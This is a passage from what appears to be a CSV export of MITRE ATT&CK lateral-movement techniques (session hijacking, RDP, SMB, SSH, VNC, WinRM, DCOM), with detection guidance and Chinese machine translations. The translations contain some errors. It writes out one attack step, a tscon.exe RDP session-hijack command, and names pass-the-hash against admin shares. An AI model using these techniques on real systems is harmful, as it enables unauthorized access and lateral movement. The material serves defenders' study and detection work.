Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1563,,,SYSTEM,,,,,,"(Citation: LogRhythm WannaCry),(Citation: Novetta-Axiom),(Citation: Windows RDP Sessions)",远程服务会话劫持：RDP 劫持,攻击者可能会劫持合法用户的远程桌面会话以在环境中横向移动。远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录到交互式会话。 Microsoft 将其远程桌面协议 (RDP) 的实现称为远程桌面服务 (RDS)。（引用：TechNet 远程桌面服务）攻击者可能会执行 RDP 会话劫持，其中涉及窃取合法用户的远程会话。通常，当其他人试图窃取他们的会话时，会通知用户。使用系统权限并使用终端服务控制台，`c:\windows\system32\tscon.exe [要被窃取的会话号]`，攻击者可以劫持会话，而无需向用户提供凭据或提示。（引用：RDP劫持 Korznikov）这可以通过活动或断开的会话远程或本地完成。（引用：RDP 劫持媒体）它还可以导致 [远程系统发现]（https://attack.mitre.org/techniques/T1018）和通过窃取域管理员或更高权限的帐户会话来提升权限。所有这些都可以通过使用本机 Windows 命令来完成，但它也已作为红队工具中的一项功能添加。（引用：Kali Redsnarf）
T1563.001,Remote Service Session Hijacking: SSH Hijacking,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)

[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",https://attack.mitre.org/techniques/T1563/001,25 February 2020,23 March 2020,1.0,Lateral Movement,"Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.","Linux, macOS","Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1563,,Anastasios Pingios,root,,"SSH service enabled, trust relationships configured, established connections",,,,",(Citation: Symantec SSH and ssh-agent)",远程服务会话劫持：SSH 劫持,攻击者可能会劫持合法用户的 SSH 会话以在环境中横向移动。 Secure Shell (SSH) 是 Linux 和 macOS 系统上远程访问的标准方法。它允许用户通过加密隧道连接到另一个系统，通常通过密码、证书或使用非对称加密密钥对进行身份验证。为了从受感染的主机横向移动，攻击者可以通过劫持与另一个系统的现有连接来利用通过活动 SSH 会话中的公钥身份验证与其他系统建立的信任关系。这可能通过破坏 SSH 代理本身或通过访问代理的套接字而发生。如果对手能够获得 root 访问权限，那么劫持 SSH 会话可能是微不足道的。（引用：Slideshare Abusing SSH）（引用：SSHjack Blackhat）（引用：Clockwork SSH Agent Hijacking）（引用：Breach Post-mortem SSH Hijack）[ SSH 劫持](https://attack.mitre.org/techniques/T1563/001) 与 [SSH](https://attack.mitre.org/techniques/T1021/004) 的使用不同，因为它劫持了现有的 SSH会话而不是使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 创建新会话。
T1021,Remote Services,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)

Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)",https://attack.mitre.org/techniques/T1021,31 May 2017,28 March 2022,1.2,Lateral Movement,"Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. 

Use of applications such as ARD may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using these applications. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. 

In macOS, you can review logs for ""screensharingd"" and ""Authentication"" event messages. Monitor network connections regarding remote management (ports tcp:3283 and tcp:5900) and for remote login (port tcp:22).(Citation: Lockboxx ARD 2019)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)","Linux, Windows, macOS","Command: Command Execution, Logon Session: Logon Session Creation, Module: Module Load, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation",False,,,"Dan Borges, @1njection",,,Active remote service accepting connections and valid credentials,CAPEC-555,,,"(Citation: ESET DazzleSpy Jan 2022),(Citation: TrendMicro BlackTech June 2017),(Citation: Symantec W.32 Stuxnet Dossier),",远程服务,攻击者可以使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 登录专门设计用于接受远程连接的服务，例如 telnet、SSH 和 VNC。然后，攻击者可以作为登录用户执行操作。在企业环境中，服务器和工作站可以组织成域。域提供集中的身份管理，允许用户在整个网络中使用一组凭据登录。如果攻击者能够获得一组有效的域凭据，他们可以使用远程访问协议（例如安全外壳 (SSH) 或远程桌面协议 (RDP)）登录到许多不同的机器。（引用：SSH 安全外壳）（引用： TechNet 远程桌面服务）合法的应用程序（例如 [软件部署工具](https://attack.mitre.org/techniques/T1072) 和其他管理程序）可以使用 [远程服务](https://attack.mitre. org/techniques/T1021) 来访问远程主机。例如，macOS 上的 Apple Remote Desktop (ARD) 是用于远程管理的本机软件。 ARD 利用多种协议，包括 [VNC](https://attack.mitre.org/techniques/T1021/005) 发送屏幕和控制缓冲区和 [SSH](https://attack.mitre.org/技术/T1021/004）用于安全文件传输。（引用：远程管理 MDM macOS）（引用：Kickstart Apple 远程桌面命令）（引用：Apple 远程桌面管理指南 3.3）攻击者可以滥用 ARD 等应用程序来获得远程代码执行并进行横向运动。在 10.14 之前的 macOS 版本中，攻击者可以将 SSH 会话升级为 ARD 会话，从而使攻击者无需用户交互即可接受 TCC（透明度、同意和控制）提示并获得对数据的访问权限。（引用：FireEye 2019 Apple远程桌面）（引用：Lockboxx ARD 2019）（引用：Kickstart Apple 远程桌面命令）
T1021.003,Remote Services: Distributed Component Object Model,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",https://attack.mitre.org/techniques/T1021/003,11 February 2020,23 June 2021,1.1,Lateral Movement,"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.

Monitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).",Windows,"Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1021,,,"Administrator, SYSTEM",,,,,,"(Citation: Cobalt Strike DCOM Jan 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Github PowerShell Empire),(Citation: Microsoft COM ACL),(Citation: Microsoft System Wide Com Keys),(Citation: Microsoft Protected View),(Citation: Microsoft Disable DCOM),(Citation: Microsoft Process Wide Com Keys)",远程服务：分布式组件对象模型,攻击者可以利用分布式组件对象模型 (DCOM) 使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 与远程机器进行交互。然后，攻击者可以作为登录用户执行操作。 Windows 组件对象模型 (COM) 是本机 Windows 应用程序编程接口 (API) 的一个组件，它支持软件对象或实现一个或多个接口的可执行代码之间的交互。通过 COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库 (DLL) 或可执行文件 (EXE)。分布式 COM (DCOM) 是透明的中间件，它使用远程过程调用 (RPC) 技术将 COM 的功能扩展到本地计算机之外。（引用：Fireeye Hunting COM June 2019）（引用：Microsoft COM）与本地和远程服务器交互的权限COM 对象由注册表中的访问控制列表 (ACL) 指定。（引用：Microsoft Process Wide Com Keys）默认情况下，只有管理员可以通过 DCOM 远程激活和启动 COM 对象。（引用：Microsoft COM ACL）通过 DCOM，对手在适当特权用户的上下文中操作可以通过 Office 应用程序远程获取任意甚至直接的 shellcode 执行（引文：Enigma Outlook DCOM 横向移动 2017 年 11 月）以及其他包含不安全方法的 Windows 对象。（引文：Enigma MMC20 COM Jan 2017）（引用：Enigma DCOM 横向移动 Jan 2017）DCOM 还可以在现有文档中执行宏（引用：Enigma Excel DCOM 2017 年 9 月）并且可以所以调用 [动态数据交换](https://attack.mitre.org/techniques/T1559/002) (DDE) 直接通过一个 COM 创建的 Microsoft Office 应用程序实例执行（引用：Cyberreason DCOM DDE 横向移动 2017 年 11 月） ，绕过对恶意文档的需求。 DCOM 可用作与 [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) 进行远程交互的方法。 （引用：MSDN WMI）
T1021.001,Remote Services: Remote Desktop Protocol,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) 

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",https://attack.mitre.org/techniques/T1021/001,11 February 2020,28 March 2022,1.1,Lateral Movement,"Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",Windows,"Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1021,,"Matthew Demaske, Adaptforward","Remote Desktop Users, User",,"RDP service enabled, account in the Remote Desktop Users group",CAPEC-555,,,"(Citation: SecureWorks August 2019),(Citation: FireEye FIN6 Apr 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cycraft Chimera April 2020),(Citation: aptsim),(Citation: Group IB Cobalt Aug 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: Fidelis njRAT June 2013),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: FireEye APT39 Jan 2019),(Citation: Check Point Warzone Feb 2020),(Citation: FireEye FIN10 June 2017),(Citation: Cybereason Bumblebee August 2022),(Citation: FireEye APT40 March 2019),(Citation: GitHub Pupy),(Citation: McAfee Night Dragon),(Citation: Unit 42 Playbook Dec 2017),(Citation: Novetta Blockbuster RATs),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub QuasarRAT),(Citation: BitDefender Chafer May 2020),(Citation: Twitter Cglyer Status Update APT3 eml),(Citation: FireEye APT41 Aug 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: PWC Cloud Hopper April 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Talos ZxShell Oct 2014),(Citation: cobaltstrike manual),(Citation: FireEye PLA),(Citation: Group IB Silence Sept 2018),(Citation: Volexity Patchwork June 2018),(Citation: FireEye CARBANAK June 2017),(Citation: Github Koadic),(Citation: Cymmetria Patchwork),(Citation: Novetta Blockbuster),(Citation: Novetta-Axiom),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: CrowdStrike Grim Spider May 2019),(Citation: FireEye TRITON 2019),(Citation: CERT-FR PYSA April 2020),(Citation: FireEye FIN6 April 2016),(Citation: US-CERT TA18-074A),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Windows RDP Sessions),(Citation: Berkley Secure)",远程服务：远程桌面协议,攻击者可以使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 使用远程桌面协议 (RDP) 登录计算机。然后，攻击者可以作为登录用户执行操作。远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录到交互式会话。 Microsoft 将其远程桌面协议 (RDP) 的实现称为远程桌面服务 (RDS)。（引用：TechNet 远程桌面服务）如果启用并允许该服务，攻击者可以通过 RDP/RDS 连接到远程系统以扩展访问权限访问具有已知凭据的帐户。攻击者可能会使用凭据访问技术来获取与 RDP 一起使用的凭据。攻击者还可以将 RDP 与 [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) 或 [Terminal Services DLL](https://attack.mitre.org/techniques/T1505) 结合使用/005) 用于持久性。（引用：Alperovitch 恶意软件）
T1021.002,Remote Services: SMB/Windows Admin Shares,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",https://attack.mitre.org/techniques/T1021/002,11 February 2020,23 March 2020,1.0,Lateral Movement,"Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1021,,,"Administrator, User",,SMB enabled; Host/network firewalls not blocking SMB ports between source and destination; Use of domain account in administrator group on remote system or default system admin account.,CAPEC-561,,,"(Citation: Alperovitch 2014),(Citation: Cycraft Chimera April 2020),(Citation: US-CERT NotPetya 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Savill 1999),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: CarbonBlack Conti July 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: McAfee Night Dragon),(Citation: Novetta Blockbuster RATs),(Citation: Symantec W32.Duqu),(Citation: Kaspersky Turla),(Citation: Symantec Buckeye),(Citation: Dell TG-1314),(Citation: FireEye Shamoon Nov 2016),(Citation: Cybereason Conti Jan 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Talos Nyetya June 2017),(Citation: Talos Olympic Destroyer 2018),(Citation: Medium Anchor DNS July 2020),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Novetta Blockbuster),(Citation: Novetta-Axiom),(Citation: Securelist BlackEnergy Nov 2014),(Citation: PsExec Russinovich),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Chafer February 2018),(Citation: SANS Conficker),(Citation: Fortinet Diavol July 2021),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Bleeping Computer - Ryuk WoL),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Cylance Cleaver),(Citation: Kaspersky Regin),(Citation: Microsoft Preventing SMB)",远程服务：SMB/Windows 管理员共享,攻击者可以使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 通过服务器消息块 (SMB) 与远程网络共享进行交互。然后，攻击者可以作为登录用户执行操作。 SMB 是用于同一网络或域上的 Windows 计算机的文件、打印机和串行端口共享协议。攻击者可以使用 SMB 与文件共享进行交互，从而允许他们在整个网络中横向移动。 SMB 的 Linux 和 macOS 实现通常使用 Samba。 Windows 系统具有只有管理员才能访问的隐藏网络共享，并提供远程文件复制和其他管理功能的能力。示例网络共享包括“C$”、“ADMIN$”和“IPC$”。攻击者可以将此技术与管理员级别的 [有效帐户](https://attack.mitre.org/techniques/T1078) 结合使用，通过 SMB 远程访问网络系统，（引用：维基百科服务器消息块）与使用远程过程调用 (RPC)（引用：TechNet RPC）的系统传输文件，并通过远程执行运行传输的二进制文件。依赖 SMB/RPC 上经过身份验证的会话的示例执行技术是 [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)、[Service Execution](https://attack.mitre.org/技术/T1569/002) 和 [Windows 管理规范](https://attack.mitre.org/techniques/T1047)。攻击者还可以使用 NTLM 哈希访问具有 [Pass the Hash] (https://attack.mitre.org/techniques/T1550/002) 以及某些配置和补丁级别的系统上的管理员共享。（引用：Microsoft Admin Shares）
T1021.004,Remote Services: SSH,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.

SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",https://attack.mitre.org/techniques/T1021/004,11 February 2020,15 October 2021,1.1,Lateral Movement,"Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

On macOS systems <code>log show --predicate 'process = ""sshd""'</code> can be used to review incoming SSH connection attempts for suspicious activity. The command <code>log show --info --predicate 'process = ""ssh"" or eventMessage contains ""ssh""'</code> can be used to review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

On Linux systems SSH activity can be found in the logs located in <code>/var/log/auth.log</code> or <code>/var/log/secure</code> depending on the distro you are using.","Linux, macOS","Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1021,,,,,An SSH server is configured and running.,CAPEC-555,,,"(Citation: FireEye TRITON 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: FireEye APT40 March 2019),(Citation: Aqua Kinsing April 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Anomali Rocke March 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Securelist GCMAN),(Citation: PWC Cloud Hopper April 2017),(Citation: Intezer TeamTNT September 2020),(Citation: Github PowerShell Empire),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Symantec Palmerworm Sep 2020),(Citation: FireEye APT39 Jan 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)",远程服务：SSH,攻击者可以使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 使用 Secure Shell (SSH) 登录远程机器。然后，攻击者可以作为登录用户执行操作。 SSH 是一种允许授权用户在其他计算机上打开远程 shell 的协议。许多 Linux 和 macOS 版本都默认安装了 SSH，但在用户启用它之前通常会禁用它。 SSH 服务器可以配置为使用标准密码身份验证或公私密钥对来代替密码或作为密码的补充。在这种身份验证方案中，用户的公钥必须位于运行服务器的计算机上的一个特殊文件中，该文件列出了允许以该用户身份登录的密钥对。
T1021.005,Remote Services: VNC,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)

VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)

Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",https://attack.mitre.org/techniques/T1021/005,11 February 2020,07 October 2021,1.1,Lateral Movement,"Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.

On macOS systems <code>log show --predicate 'process = ""screensharingd"" and eventMessage contains ""Authentication:""'</code> can be used to review incoming VNC connection attempts for suspicious activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

Monitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse.(Citation: Gnome Remote Desktop grd-settings)(Citation: Gnome Remote Desktop gschema)","Linux, Windows, macOS","Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1021,,,,,VNC server installed and listening for connections.,CAPEC-555,,,"(Citation: Prevx Carberp March 2011),(Citation: objsee mac malware 2017),(Citation: Unit 42 Gamaredon February 2022),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Talos ZxShell Oct 2014),(Citation: Securelist GCMAN),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Trickbot VNC module July 2021),(Citation: Microsoft Actinium February 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Symantec Shuckworm January 2022),(Citation: CISA AA20-259A Iran-Based Actor September 2020),",远程服务：VNC,攻击者可以使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 使用虚拟网络计算 (VNC) 远程控制机器。 VNC 是一个独立于平台的桌面共享系统，它使用 RFB（“远程帧缓冲”）协议，使用户能够通过网络中继屏幕、鼠标和键盘输入来远程控制另一台计算机的显示器。（引用：远程帧缓冲协议) VNC 与 [远程桌面协议](https://attack.mitre.org/techniques/T1021/001) 不同，因为 VNC 是屏幕共享软件而不是资源共享软件。默认情况下，VNC 使用系统的身份验证，但可以将其配置为使用特定于 VNC 的凭据。（引用：MacOS VNC 远程桌面软件）（引用：VNC 身份验证）攻击者可能会滥用 VNC 在登录时执行恶意操作用户，例如打开文档、下载文件和运行任意命令。攻击者可以使用 VNC 远程控制和监视系统以收集数据和信息，从而转向网络中的其他系统。特定的 VNC 库/实现也容易受到暴力攻击和内存使用攻击。（引用：劫持 VNC）（引用：macOS root VNC 登录无需身份验证）（引用：VNC 漏洞）（引用：进攻性安全 VNC 身份验证检查）（引文：攻击 VNC 服务器 PentestLab）（引文：Havana 身份验证错误）
T1021.006,Remote Services: Windows Remote Management,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",https://attack.mitre.org/techniques/T1021/006,11 February 2020,23 June 2021,1.1,Lateral Movement,"Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.  Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement) Also monitor for remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS).",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation, Service: Service Metadata",True,T1021,,,"Administrator, User",,,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Chimera January 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: cobaltstrike manual),(Citation: Symantec RAINDROP January 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NSA Spotting)",远程服务：Windows 远程管理,攻击者可以使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 与使用 Windows 远程管理 (WinRM) 的远程系统进行交互。然后，攻击者可以作为登录用户执行操作。 WinRM 是 Windows 服务和协议的名称，它允许用户与远程系统交互（例如，运行可执行文件、修改注册表、修改服务）。（引用：Microsoft WinRM）可以使用 ` winrm` 